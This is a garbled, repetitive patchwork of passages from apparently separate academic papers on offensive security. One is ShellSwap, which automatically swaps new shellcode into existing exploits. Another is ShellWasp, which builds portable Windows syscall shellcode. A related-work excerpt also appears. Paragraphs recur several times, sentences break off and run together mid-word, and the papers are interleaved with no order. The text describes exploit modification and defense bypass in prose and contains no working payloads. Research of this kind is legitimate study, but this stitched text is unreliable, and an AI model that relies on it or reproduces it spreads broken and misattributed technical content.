the new program state is exploitable, our system starts again from the preprocessing phase to \ufb01t the replacement shellcode into the new exploitable program state. Otherwise, the system will attempt to construct the other paths and generate the other program states, falling back on the Two-Stage Fallback if it is unable to do so. D. Two-Stage Fallback If ShellSwap is unable to overcome the memory and path con\ufb02icts and \ufb01t the replacement shellcode into the exploitable state, then it falls back on pre-de\ufb01ned a two-stage shellcode instead of the provided replacement shellcode. The motivation of this fallback is straightforward: if the provided shellcode cannot \ufb01t the exploitable state, even after Path Kneading, wenAlthough it can identify violations to our security policy caused by tainted input, it cannot recover and track path constraints. Thus, in our system, we apply concolic execution to trace the path that the exploit runs on the program. We ensure tracingaccuracy in two ways: we record a dynamic trace of the exploit process (and require that our symbolic trace conform to the same instructions), and we pre-constrain the symbolic data to be equal to the original exploit. The former avoids the path explosion inherent in concolic execution exploration (because we only care about the branch that the exploit chooses), and the latter greatly simpli\ufb01es the job of the symbolic constraint solver during tracing (by providing it with a pre-determined solution). This method is similar to the pre-constraint tracing and the input pre-constraining approach proposed by Driller [ 30] (and, in fact, part of the implementation derives off of Driller\u2019s tracing module). The trace-directed symbolic execution takes a program and an original exploit and produces path constraints and the exploitable state. The exploitable state includes the symbolic value of registers and memory at the moment that the program starts to execute the shellcode. After this step completes,the pre-constraints introduced in the beginning are removed,making it possible to constrain some of the memory in the exploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program toexploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program to execute the same execution trace and triggers the vulnerability. IV .

This is important because many automated shellcode placement methods are insufficient for shellcode transplant due to their over-constrained nature, requiring the execution path of the modified exploit to be identical to the original one. ShellSwap uses symbolic tracing, along with shellcode layout remediation and path kneading, to achieve shellcode transplant while avoiding these issues. By generating a new control flow graph and inserting the new shellcode into the appropriate locations, ShellSwap can produce a modified exploit that carries out the desired actions specified by the attacker."}

Optimizations Much of the execution in symbolic tracing does not involve symbolic data.

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit.

Config file and Customizing Syscalls. Users may supply desired syscalls in the config file, and they also may be provided as input in the command line interface, by typing one per name. When providing them as input, it is case insensitive. It can be desirable at times to have the same syscall used more than once, and ShellWasp supports doing so. To save space and avoid redundancy, however, it will only initialize each once in the syscall array. Thus, if a syscall is used three times in the shellcode, it will only have one element in the syscall array. ShellWasp is intended to be highly flexible, so users can easily rearrange the order of syscalls, using the rear- range feature. It only takes seconds to rearrange the order of syscalls. Similarly, specific Windows releases can quickly be added or removed in seconds. ShellWasp allows users to save their currentnsubsequent functions \u2013 be it WinAPI calls or syscalls. This requires the shellcode author to be aware of where in memory output may appear. With original scientific contributions, it is necessary to provide some validation that shows that the research works well and is effective; in this section, we provide evidence that our research has been validated. Firstly, with Shell- Wasp, the tool, validation is achieved by showing the accuracy and correctness of the shellcode and Assembly it creates. Secondly, the case studies below provide validation, showing how ShellWasp can be used to create actual shellcode that uses multiple syscalls to achieve complex, malicious functionality.

Similarly, specific Windows releases can quickly be added or removed in seconds. ShellWasp allows users to save their currentnsubsequent functions \u2013 be it WinAPI calls or syscalls. This requires the shellcode author to be aware of where in memory output may appear. With original scientific contributions, it is necessary to provide some validation that shows that the research works well and is effective; in this section, we provide evidence that our research has been validated. Firstly, with Shell- Wasp, the tool, validation is achieved by showing the accuracy and correctness of the shellcode and Assembly it creates. Secondly, the case studies below provide validation, showing how ShellWasp can be used to create actual shellcode that uses multiple syscalls to achieve complex, malicious functionality. The tool itself additionally is an embodiment of a novel technique created by this research to overcome the portability problem with syscall shell- code, and that too can be used outside of the context of the tool; the case studies stand as evidence in support of this. Finally, this research has proposed a newnfor instance, has more than thirteen OS releases. This research provides a methodology to overcome the portability problem associated with shellcode. It also provides a methodology for how to utilize syscalls in shellcode. Finally, this research presents a new tool, ShellWasp, which builds templates of syscall shellcode. ShellWasp utilizes a novel syscall array, which can be populated at runtime with the correct SSNs, allowing syscall shellcode to be able to function across multiple OSs and OS releases. ShellWasp builds the shellcode\u2019s underlying infrastructure, so that it can effectively use the syscall array at runtime, without the need for using hardcoded syscall values. ShellWasp additionally labels all syscall parameters, making it easier for shellcode authors to understand how to construct syscall shellcode. Keywords: Shellcode, Windows syscalls, Reverse Engineering, Offensive Security Windows syscalls in shellcode have only been used on extremely rare occasions, with the singlenprecomputed syscall values, tailored to not every single Windows release in existence, but just the ones that the shellcode authors deem most likely to be used for a specific target, allowing the shellcode to achieve a vastly smaller size, than would otherwise need to be the case. Utilizing the PEB to identify the OS Build in ShellWasp naively was done through happenstance and looking closely at the members of the PEB structure, as described elsewhere here. Regardless, the PEB is how the first SysWhispers identified specific OS builds, though with 64-bit rather than 32-bit code. Once criticism leveled at SysWhispers was that it was too reliant on the syscall tables [4] created by another individual. While ShellWasp actually uses some syscall tables from the same source, we also are not reliant on it, in that we have created our own for new releases and plan to do so for all future OS builds that we decide to support. Moreover, we provide an alternative way to generate these \u2013 one fornused purely as an exploit replaying system. 2) Exploit Replayabilty: ShellSwap assumes that the original exploit is deterministically replayable, in the sense that the exploit always succeeds when re-launched against the target. However, this assumption does not always hold. For instance, a vulnerable server may implement a challenge-response protocol that requires the client to send messages with a nonce that the two sides negotiated at the beginning of the session. This nonce would change when we replay the exploit, and the exploit would fail. Asymmetric encryption and sources of randomness from the environment can also manifest in such failures. To generate the modi\ufb01ed exploit for such case, ShellSwap would have to consider an exploit as a state machine rather than a series static bytes, which would require fundamental extensions of the design. This being said, our experiments showed that most of the exploits in our dataset are replayable, and our system is applicable for this majority. We intend to investigate the replaying of non-deterministic exploits in future work. 3) Modern Defense Mechanisms: Modern systems have memory protection mechanisms such as Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). However, such protection mechanisms can be bypassed by properly-crafted exploits. Our solution to the shellcode transplant problem is based on an functional original exploit, which implies that this exploit has already bypassed the required defense mechanisms. When this is the case, ShellSwap\u2019s replacement exploit often bypasses these mitigation techniques as well. For example, DEP is often bypassed through the use of Return Oriented Programming that chains pieces of code (termed gadgets )i na program to map an executable page (using the Linux mmap or DECREE allocate syscalls), insert shellcode into it, and execute it. Alternatively, the page containing the shellcode (for example, the program stack) can simply be marked executablenAlthough it can identify violations to our security policy caused by tainted input, it cannot recover and track path constraints. Thus, in our system, we apply concolic execution to trace the path that the exploit runs on the program. We ensure tracingaccuracy in two ways: we record a dynamic trace of the exploit process (and require that our symbolic trace conform to the same instructions), and we pre-constrain the symbolic data to be equal to the original exploit. The former avoids the path explosion inherent in concolic execution exploration (because we only care about the branch that the exploit chooses), and the latter greatly simpli\ufb01es the job of the symbolic constraint solver during tracing (by providing it with a pre-determined solution). This method is similar to the pre-constraint tracing and the input pre-constraining approach proposed by Driller [ 30] (and, in fact, part of the implementation derives off of Driller\u2019s tracing module). The trace-directed symbolic execution takes a program and an original exploit and produces path constraints and the exploitable state. The exploitable state includes the symbolic value of registers and memory at the moment that the program starts to execute the shellcode. After this step completes,the pre-constraints introduced in the beginning are removed,making it possible to constrain some of the memory in the exploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program toexploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program to execute the same execution trace and triggers the vulnerability. IV . S HELLCODE TRANSPLANT After the exploitable state and the path constraints associated with it have been recovered, ShellSwap can attempt to re-n3) Surmounting the challenges: The intelligent reader can certainly envision approaches to achieve shellcode transplanting in the motivating example. However, this example is just 12 lines of code. One can see that, with bigger examples and in the general case, these challenges can be quite complicated to surmount. In the rest of the paper, we will discuss how to identify con\ufb02icts while transplanting the shellcode and how to satisfy both memory and path con\ufb02icts to successfully transplant shellcode in a wide variety of exploits. III. S YMBOLIC TRACING Essentially, ShellSwap separates the entire execution of the original exploit into two phases: before the control-\ufb02ow hijack and after the control-\ufb02ow hijack. The Symbolic Tracing step analyzes the former. The goal of this step is to generate the exploitable state of the program and record the path constraints that are induced by conditional branches that are encountered on the path. This involves two main considerations. First, we must determine when the control-\ufb02ow hijack occurs. We do this by leveraging the concept of security policies, which has been thoroughly explored by researchers [ 10,16, 18,21,32]. In our work, we use the well-studied taint-based enforceable security policy [ 26,32]. This policy determines whether or not a program state is safe by checking the instruction being executed. If the instruction directly is tainted by remote input, then the program state is deemed unsafe and the path is terminated. Second, we must determine how to perform the tracing, as there are several possible techniques that might be used here. For example, we could use dynamic taint analysis to identify when executed instructions are tainted by input data. While this would be relatively fast, taint analysis is not suf\ufb01cient. Although it can identify violations to our security policy caused by tainted input, it cannot recover and track path constraints. Thus, in our system, we apply concolic execution to trace then08048304 mov     eax, [ebp+var_24] 08048307 add     eax, 1 0804830C mov     [ebp+var_24], eax 0804830F jmp     loc_80482E608048314 mov     eax, [ebp+len] 08048317 mov     [ebp+ret], eax \u2026x01\u2026x01 Fig. 6: Part of the control \ufb02ow graph for the motivating example. nc\u2032. For the new path, the basic blocks do not change before nc\u2032or after nd. In between, we insert an intraprocedural path from nc\u2032tondG(nc\u2032,nd), which can be generated using the control graph of the function. In the best case, the question is equivalent to \ufb01nding a path between two nodes in a directed graph. However, it is possible that there is no such path to rejoin the original path, or that the problem reduces to symbolic exploration (if the divergence is too big). In this case, ShellSwap falls back on the Two-Stage Fallback. In the motivating example, as simply exiting the loop already rejoins the original path, the detour back to the path is trivial: it is the direct jump to the return site of the example function. After constructing the new path, the ShellSwap system generates the new exploitable program state and a new set of path constraints using the Symbolic Tracing step. Meanwhile, it also checks if the new program state is still exploitable. If the new program state is exploitable, our system starts again from the preprocessing phase to \ufb01t the replacement shellcode into the new exploitable program state. Otherwise, the system will attempt to construct the other paths and generate the other program states, falling back on the Two-Stage Fallback if it is unable to do so. D. Two-Stage Fallback If ShellSwap is unable to overcome the memory and path con\ufb02icts and \ufb01t the replacement shellcode into the exploitable state, then it falls back on pre-de\ufb01ned a two-stage shellcode instead of the provided replacement shellcode.

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit. Among the 100 test cases, our system successfully generated 88% of the exploits. I. I NTRODUCTION Remote exploits are extremely dangerous.

Config file and Customizing Syscalls. Users may supply desired syscalls in the config file, and they also may be provided as input in the command line interface, by typing one per name. When providing them as input, it is case insensitive. It can be desirable at times to have the same syscall used more than once, and ShellWasp supports doing so.

Thus, if a syscall is used three times in the shellcode, it will only have one element in the syscall array. ShellWasp is intended to be highly flexible, so users can easily rearrange the order of syscalls, using the rear- range feature. It only takes seconds to rearrange the order of syscalls. Similarly, specific Windows releases can quickly be added or removed in seconds. ShellWasp allows users to save their currentnsubsequent functions \u2013 be it WinAPI calls or syscalls. This requires the shellcode author to be aware of where in memory output may appear. With original scientific contributions, it is necessary to provide some validation that shows that the research works well and is effective; in this section, we provide evidence that our research has been validated. Firstly, with Shell- Wasp, the tool, validation is achieved by showing the accuracy and correctness of the shellcode and Assembly it creates. Secondly, the case studies below provide validation, showing how ShellWasp can be used to create actual shellcode that uses multiple syscalls to achieve complex, malicious functionality. The tool itself additionally is an embodiment of a novel technique created by this research to overcome the portability problem with syscall shell- code, and that too can be used outside of the context of the tool; the case studies stand as evidence in support of this. Finally, this research has proposed a newnfor instance, has more than thirteen OS releases. This research provides a methodology to overcome the portability problem associated with shellcode. It also provides a methodology for how to utilize syscalls in shellcode. Finally, this research presents a new tool, ShellWasp, which builds templates of syscall shellcode. ShellWasp utilizes a novel syscall array, which can be populated at runtime with the correct SSNs, allowing syscall shellcode to be able to function across multiple OSs and OS releases. ShellWasp builds the shellcode\u2019s underlying infrastructure, so that it can effectively use the syscall array at runtime, without the need for using hardcoded syscall values. ShellWasp additionally labels all syscall parameters, making it easier for shellcode authors to understand how to construct syscall shellcode. Keywords: Shellcode, Windows syscalls, Reverse Engineering, Offensive Security Windows syscalls in shellcode have only been used on extremely rare occasions, with the singlenprecomputed syscall values, tailored to not every single Windows release in existence, but just the ones that the shellcode authors deem most likely to be used for a specific target, allowing the shellcode to achieve a vastly smaller size, than would otherwise need to be the case. Utilizing the PEB to identify the OS Build in ShellWasp naively was done through happenstance and looking closely at the members of the PEB structure, as described elsewhere here. Regardless, the PEB is how the first SysWhispers identified specific OS builds, though with 64-bit rather than 32-bit code. Once criticism leveled at SysWhispers was that it was too reliant on the syscall tables [4] created by another individual. While ShellWasp actually uses some syscall tables from the same source, we also are not reliant on it, in that we have created our own for new releases and plan to do so for all future OS builds that we decide to support. Moreover, we provide an alternative way to generate these \u2013 one fornis hampered by the inability of the symbolic execution engine to ef\ufb01ciently reverse complex data transformations. In fact, as we show in our evaluation, less than a third of the original exploits in our dataset can be modi\ufb01ed by existing techniques.

Restrictions apply.targets the same vulnerability as the original exploit does but executes the replacement shellcode after exploitation. ShellSwap tackles the challenges discussed above with a mix of symbolic execution and static analysis techniques, applying novel techniques to identify the original shellcode, recover the data transformation performed on it, and resolve any con\ufb02icts introduced by the transplant of the replacement shellcode. By utilizing information obtained from the original exploit and creatively transforming the replacement shellcode, ShellSwap rarely degrades to a pure symbolic exploration, and is thus more ef\ufb01cient and effective compared to previous solutions.Additionally, the use of carefully-designed systematic approaches enables ShellSwap to transplant more shellcode variants. In our experiment, ShellSwap successfully generates new exploits for 88% of all cases, which is almost three times the success rate of prior techniques. To the best of our knowledge, ShellSwap is the \ufb01rst automated system that modi\ufb01es exploits based on shellcode provided by analysts. In terms of offense, ShellSwap greatly reduces the overhead in attack re\ufb02ection, which enables prompt responses to security incidents like 0-day attacks, especiallynsuccessfully generated: SystemM successfully generated 31 exploits, whereas ShellSwap successfully generated 88 exploits. The success rate for SystemM and ShellSwap are 31% and 88%, respectively. Not surprisingly, our method generated more new exploits than previous work. Statistics for all modi\ufb01ed exploits successfully generated by SystemM and ShellSwap are shown in Table III. ShellSwap generated 57 exploits using only Layout Remediation and 31 more by leveraging Path Kneading. For comparison, we also extended SystemM with Layout Remediation, resulting in, as expected, an additional 26 more exploits over the base SystemM implementation. Only 57% of all cases are successfully replaced with new shellcode without Path Kneading, which demonstrates the importance of con\ufb02ict identi\ufb01cation and kneading of the exploit path during shellcode replacement. In addition, we evaluate the two-stage fallback on all 20 exploits: we replace the original shellcode in each exploit with the fallback shellcode and generate new exploits2.I no u r experiment, the two-stage fallback worked on 19 out of 20 exploits. This is because the fallback shellcode is shorter (19 bytes) than any instance of the replacement shellcode, and is thus more likely to \ufb01t into buffers under attacker controls. Meanwhile, we observe that the success rate of shellcode transplanting varies between different instances of replacement shellcode (see Table IV). There is an expected negative correlation between the success rate and the length of the replacement shellcode. For example, shellcode S4and S5, which are both 37 byte long, have lower success rates than other replacement shellcode that are shorter. This \ufb01ts with our intuition that the longer a piece of shellcode is, the more con\ufb02icts it might produce during the shellcode transplant step, and the more dif\ufb01cult it will be to generate a modi\ufb01ed exploit. Other results are less intuitive.

We verify the modi\ufb01ed exploit against the binary in DECREE box to make sure that it works and that the replacement shellcode is executed with intended results.

[ 12] in a new system on top of angr and used it as our reference system (codenamed SystemM). We simulate shellcode transplanting in SystemM by \ufb01rst re-triggering the exploit and then re-constraining individual symbolic blocks in memory to the replacement shellcode one by one until the modi\ufb01ed exploit is created. If none of the symbolic memory blocks is suf\ufb01ciently large to hold the replacement shellcode, or constraining every symbolic memory block to replacement shellcode leads to an unsatis\ufb01able exploitation state (due to path con\ufb02icts), then we deem the shellcode transplanting as having failed.

Optimizations Much of the execution in symbolic tracing does not involve symbolic data. To speed up the tracing step, ShellSwap enables code JIT\u2019ing (through the use of Unicorn Engine [ 24]) by default, which allows instructions in the original exploit to be executed natively instead of being emulated. While it greatly speed up symbolic tracing, we \ufb01nd that this step is still the bottleneck in ShellSwap: as discussed in Section VI, an average of 95% of execution time is spent in this step. To avoid generating an entire control-\ufb02ow graph in our path kneading component, we used a fast function detection approach to pick out the exact function for which to generate the control \ufb02ow [ 9]. In the course of the development of this system, we have upstreamed many big-\ufb01xes and some improvements to angr and its tracing module.

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit. Among the 100 test cases, our system successfully generated 88% of the exploits. I. I NTRODUCTION Remote exploits are extremely dangerous.

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit. Among the 100 test cases, our system successfully generated 88% of the exploits. I. I NTRODUCTION Remote exploits are extremely dangerous.

Config file and Customizing Syscalls. Users may supply desired syscalls in the config file, and they also may be provided as input in the command line interface, by typing one per name. When providing them as input, it is case insensitive. It can be desirable at times to have the same syscall used more than once, and ShellWasp supports doing so. To save space and avoid redundancy, however, it will only initialize each once in the syscall array. Thus, if a syscall is used three times in the shellcode, it will only have one element in the syscall array. ShellWasp is intended to be highly flexible, so users can easily rearrange the order of syscalls, using the rear- range feature. It only takes seconds to rearrange the order of syscalls. Similarly, specific Windows releases can quickly be added or removed in seconds. ShellWasp allows users to save their currentnsubsequent functions \u2013 be it WinAPI calls or syscalls. This requires the shellcode author to be aware of where in memory output may appear. With original scientific contributions, it is necessary to provide some validation that shows that the research works well and is effective; in this section, we provide evidence that our research has been validated. Firstly, with Shell- Wasp, the tool, validation is achieved by showing the accuracy and correctness of the shellcode and Assembly it creates. Secondly, the case studies below provide validation, showing how ShellWasp can be used to create actual shellcode that uses multiple syscalls to achieve complex, malicious functionality. The tool itself additionally is an embodiment of a novel technique created by this research to overcome the portability problem with syscall shell- code, and that too can be used outside of the context of the tool; the case studies stand as evidence in support of this. Finally, this research has proposed a newnfor instance, has more than thirteen OS releases. This research provides a methodology to overcome the portability problem associated with shellcode. It also provides a methodology for how to utilize syscalls in shellcode. Finally, this research presents a new tool, ShellWasp, which builds templates of syscall shellcode. ShellWasp utilizes a novel syscall array, which can be populated at runtime with the correct SSNs, allowing syscall shellcode to be able to function across multiple OSs and OS releases. ShellWasp builds the shellcode\u2019s underlying infrastructure, so that it can effectively use the syscall array at runtime, without the need for using hardcoded syscall values. ShellWasp additionally labels all syscall parameters, making it easier for shellcode authors to understand how to construct syscall shellcode. Keywords: Shellcode, Windows syscalls, Reverse Engineering, Offensive Security Windows syscalls in shellcode have only been used on extremely rare occasions, with the singlenprecomputed syscall values, tailored to not every single Windows release in existence, but just the ones that the shellcode authors deem most likely to be used for a specific target, allowing the shellcode to achieve a vastly smaller size, than would otherwise need to be the case. Utilizing the PEB to identify the OS Build in ShellWasp naively was done through happenstance and looking closely at the members of the PEB structure, as described elsewhere here. Regardless, the PEB is how the first SysWhispers identified specific OS builds, though with 64-bit rather than 32-bit code. Once criticism leveled at SysWhispers was that it was too reliant on the syscall tables [4] created by another individual. While ShellWasp actually uses some syscall tables from the same source, we also are not reliant on it, in that we have created our own for new releases and plan to do so for all future OS builds that we decide to support. Moreover, we provide an alternative way to generate these \u2013 one fornsuccessfully generated: SystemM successfully generated 31 exploits, whereas ShellSwap successfully generated 88 exploits. The success rate for SystemM and ShellSwap are 31% and 88%, respectively. Not surprisingly, our method generated more new exploits than previous work. Statistics for all modi\ufb01ed exploits successfully generated by SystemM and ShellSwap are shown in Table III. ShellSwap generated 57 exploits using only Layout Remediation and 31 more by leveraging Path Kneading. For comparison, we also extended SystemM with Layout Remediation, resulting in, as expected, an additional 26 more exploits over the base SystemM implementation. Only 57% of all cases are successfully replaced with new shellcode without Path Kneading, which demonstrates the importance of con\ufb02ict identi\ufb01cation and kneading of the exploit path during shellcode replacement. In addition, we evaluate the two-stage fallback on all 20 exploits: we replace the original shellcode in each exploit with the fallback shellcode and generate new exploits2.I no u r experiment, the two-stage fallback worked on 19 out of 20 exploits. This is because the fallback shellcode is shorter (19 bytes) than any instance of the replacement shellcode, and is thus more likely to \ufb01t into buffers under attacker controls. Meanwhile, we observe that the success rate of shellcode transplanting varies between different instances of replacement shellcode (see Table IV). There is an expected negative correlation between the success rate and the length of the replacement shellcode. For example, shellcode S4and S5, which are both 37 byte long, have lower success rates than other replacement shellcode that are shorter. This \ufb01ts with our intuition that the longer a piece of shellcode is, the more con\ufb02icts it might produce during the shellcode transplant step, and the more dif\ufb01cult it will be to generate a modi\ufb01ed exploit.

With original scientific contributions, it is necessary to provide some validation that shows that the research works well and is effective; in this section, we provide evidence that our research has been validated. Firstly, with Shell- Wasp, the tool, validation is achieved by showing the accuracy and correctness of the shellcode and Assembly it creates. Secondly, the case studies below provide validation, showing how ShellWasp can be used to create actual shellcode that uses multiple syscalls to achieve complex, malicious functionality. The tool itself additionally is an embodiment of a novel technique created by this research to overcome the portability problem with syscall shell- code, and that too can be used outside of the context of the tool; the case studies stand as evidence in support of this. Finally, this research has proposed a newnfor instance, has more than thirteen OS releases. This research provides a methodology to overcome the portability problem associated with shellcode. It also provides a methodology for how to utilize syscalls in shellcode. Finally, this research presents a new tool, ShellWasp, which builds templates of syscall shellcode. ShellWasp utilizes a novel syscall array, which can be populated at runtime with the correct SSNs, allowing syscall shellcode to be able to function across multiple OSs and OS releases. ShellWasp builds the shellcode\u2019s underlying infrastructure, so that it can effectively use the syscall array at runtime, without the need for using hardcoded syscall values. ShellWasp additionally labels all syscall parameters, making it easier for shellcode authors to understand how to construct syscall shellcode. Keywords: Shellcode, Windows syscalls, Reverse Engineering, Offensive Security Windows syscalls in shellcode have only been used on extremely rare occasions, with the singlenprecomputed syscall values, tailored to not every single Windows release in existence, but just the ones that the shellcode authors deem most likely to be used for a specific target, allowing the shellcode to achieve a vastly smaller size, than would otherwise need to be the case. Utilizing the PEB to identify the OS Build in ShellWasp naively was done through happenstance and looking closely at the members of the PEB structure, as described elsewhere here. Regardless, the PEB is how the first SysWhispers identified specific OS builds, though with 64-bit rather than 32-bit code. Once criticism leveled at SysWhispers was that it was too reliant on the syscall tables [4] created by another individual. While ShellWasp actually uses some syscall tables from the same source, we also are not reliant on it, in that we have created our own for new releases and plan to do so for all future OS builds that we decide to support.

For the new path, the basic blocks do not change before nc\u2032or after nd. In between, we insert an intraprocedural path from nc\u2032tondG(nc\u2032,nd), which can be generated using the control graph of the function. In the best case, the question is equivalent to \ufb01nding a path between two nodes in a directed graph. However, it is possible that there is no such path to rejoin the original path, or that the problem reduces to symbolic exploration (if the divergence is too big). In this case, ShellSwap falls back on the Two-Stage Fallback. In the motivating example, as simply exiting the loop already rejoins the original path, the detour back to the path is trivial: it is the direct jump to the return site of the example function. After constructing the new path, the ShellSwap system generates the new exploitable program state and a new set of path constraints using the Symbolic Tracing step. Meanwhile, it also checks if the new program state is still exploitable. If the new program state is exploitable, our system starts again from the preprocessing phase to \ufb01t the replacement shellcode into the new exploitable program state. Otherwise, the system will attempt to construct the other paths and generate the other program states, falling back on the Two-Stage Fallback if it is unable to do so. D. Two-Stage Fallback If ShellSwap is unable to overcome the memory and path con\ufb02icts and \ufb01t the replacement shellcode into the exploitable state, then it falls back on pre-de\ufb01ned a two-stage shellcode instead of the provided replacement shellcode. The motivation of this fallback is straightforward: if the provided shellcode cannot \ufb01t the exploitable state, even after Path Kneading, wen3) Surmounting the challenges: The intelligent reader can certainly envision approaches to achieve shellcode transplanting in the motivating example. However, this example is just 12 lines of code. One can see that, with bigger examples and in the general case, these challenges can be quite complicated to surmount. In the rest of the paper, we will discuss how to identify con\ufb02icts while transplanting the shellcode and how to satisfy both memory and path con\ufb02icts to successfully transplant shellcode in a wide variety of exploits. III. S YMBOLIC TRACING Essentially, ShellSwap separates the entire execution of the original exploit into two phases: before the control-\ufb02ow hijack and after the control-\ufb02ow hijack. The Symbolic Tracing step analyzes the former. The goal of this step is to generate the exploitable state of the program and record the path constraints that are induced by conditional branches that are encountered on the path. This involves two main considerations. First, we must determine when the control-\ufb02ow hijack occurs. We do this by leveraging the concept of security policies, which has been thoroughly explored by researchers [ 10,16, 18,21,32]. In our work, we use the well-studied taint-based enforceable security policy [ 26,32]. This policy determines whether or not a program state is safe by checking the instruction being executed. If the instruction directly is tainted by remote input, then the program state is deemed unsafe and the path is terminated. Second, we must determine how to perform the tracing, as there are several possible techniques that might be used here. For example, we could use dynamic taint analysis to identify when executed instructions are tainted by input data. While this would be relatively fast, taint analysis is not suf\ufb01cient. Although it can identify violations to our security policy caused by tainted input, it cannot recover and track path constraints. Thus, in our system, we apply concolic execution to trace thensummarization. Finally, we emphasize the novelty of our study. A. Shellcode Analysis Arce [2] was the \ufb01rst to describe the development of shellcode and introduced the working principle and defensive measures of shellcode. Borders et al. [9] proposed Spector. This approach used symbolic execution to extract meaningful API calls and their arguments from shellcode, which can help the users know what the vulnerability is used for. Mason et al. [1] proposed a technique for automatically generating shellcode using natural language generation techniques. Chen et al. [10] designed a new type of shellcode, which is based on JOP (Jump-Oriented Programming) gadgets. Experimental results proved that this new JOP-based shellcode can bypass most existing ROP (Return-Oriented Programming) defenses. Bao et al. [7] designed an automated shellcode porting system ShellSwap for remote exploits. This system is the \ufb01rst end-to- end system, which can modify the observed vulnerabilities and replace thenAlthough it can identify violations to our security policy caused by tainted input, it cannot recover and track path constraints. Thus, in our system, we apply concolic execution to trace the path that the exploit runs on the program. We ensure tracingaccuracy in two ways: we record a dynamic trace of the exploit process (and require that our symbolic trace conform to the same instructions), and we pre-constrain the symbolic data to be equal to the original exploit. The former avoids the path explosion inherent in concolic execution exploration (because we only care about the branch that the exploit chooses), and the latter greatly simpli\ufb01es the job of the symbolic constraint solver during tracing (by providing it with a pre-determined solution). This method is similar to the pre-constraint tracing and the input pre-constraining approach proposed by Driller [ 30] (and, in fact, part of the implementation derives off of Driller\u2019s tracing module). The trace-directed symbolic execution takes a program and an original exploit and produces path constraints and the exploitable state. The exploitable state includes the symbolic value of registers and memory at the moment that the program starts to execute the shellcode. After this step completes,the pre-constraints introduced in the beginning are removed,making it possible to constrain some of the memory in the exploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program toexploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program to execute the same execution trace and triggers the vulnerability. IV . S HELLCODE TRANSPLANT After the exploitable state and the path constraints associated with it have been recovered, ShellSwap can attempt to re-nused purely as an exploit replaying system. 2) Exploit Replayabilty: ShellSwap assumes that the original exploit is deterministically replayable, in the sense that the exploit always succeeds when re-launched against the target. However, this assumption does not always hold. For instance, a vulnerable server may implement a challenge-response protocol that requires the client to send messages with a nonce that the two sides negotiated at the beginning of the session. This nonce would change when we replay the exploit, and the exploit would fail. Asymmetric encryption and sources of randomness from the environment can also manifest in such failures. To generate the modi\ufb01ed exploit for such case, ShellSwap would have to consider an exploit as a state machine rather than a series static bytes, which would require fundamental extensions of the design. This being said, our experiments showed that most of the exploits in our dataset are replayable, and our system is applicable for this majority. We intend to investigate the replaying of non-deterministic exploits in future work. 3) Modern Defense Mechanisms: Modern systems have memory protection mechanisms such as Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). However, such protection mechanisms can be bypassed by properly-crafted 